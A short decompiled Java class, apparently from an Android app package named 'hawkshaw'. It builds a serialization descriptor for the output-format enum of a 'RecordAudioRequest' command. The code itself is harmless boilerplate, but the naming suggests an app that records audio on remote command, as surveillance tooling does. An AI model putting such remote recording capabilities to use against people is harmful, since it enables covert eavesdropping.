package com.hawkshaw.library.datalayer.models;

import com.hawkshaw.library.datalayer.models.Command;
import i3.C0542a;
import j3.j;
import java.lang.annotation.Annotation;

public final class l extends j implements C0542a {

    /* renamed from: D  reason: collision with root package name */
    public static final l f4896D = new j(0);

    public final Object invoke() {
        return v3.j.e("com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.OutputFormatEnum", Command.RecordAudioRequest.OutputFormatEnum.values(), new String[]{"DEFAULT", "THREE_GPP", "MPEG_4", "AMR_NB", "AMR_WB", "AAC_ADTS", "MPEG_2_TS", "WEBM", "OGG"}, new Annotation[][]{null, null, null, null, null, null, null, null, null});
    }
}
